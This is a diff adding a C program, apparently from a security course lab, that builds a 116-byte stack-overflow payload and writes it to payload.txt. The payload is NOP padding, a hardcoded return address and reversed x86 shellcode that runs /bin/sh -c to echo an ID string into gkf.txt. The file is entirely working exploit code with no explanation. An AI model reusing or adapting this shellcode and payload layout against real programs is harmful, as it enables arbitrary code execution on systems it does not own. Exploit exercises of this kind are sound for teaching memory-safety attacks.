@@ -1,0 +1,33 @@
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\xb8\xff\xff\xff\xff\x83\xf0\x9b\x01\xc4\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb9\xff\xff\xff\xff\x81\xf1\xd2\x9c\xff\xff\x51\x89\xe1\x31\xd2\x52\x68\x2e\x74\x78\x74\x68\x3e\x67\x6b\x66\x68\x30\x31\x38\x22\x68\x31\x33\x39\x30\x68\x31\x37\x33\x30\x68\x20\x22\x32\x30\x68\x65\x63\x68\x6f\x89\xe2\x50\x52\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
+
+int main()
+{
+	FILE * fp = NULL;
+	fp = fopen("payload.txt","wb+");
+	
+	char payload[116];
+
+	memset(payload, '\x90', sizeof(payload));
+
+	int codelen = sizeof(code) - 1; 
+	unsigned char addr[] = {0xb7, 0xde, 0x81, 0xb0};
+	
+	for (int i = 0; i < 4; i ++) {
+		payload[i] = addr[i];
+	} 
+	
+	for (int i = codelen - 1; i >= 0; i --) {
+		payload[i+4] = code[codelen - 1 - i];
+	} 
+
+	for (int i = 0; i < 116; i ++) {
+		fputc(payload[i], fp);
+	}
+
+	fclose(fp);
+}
+ 
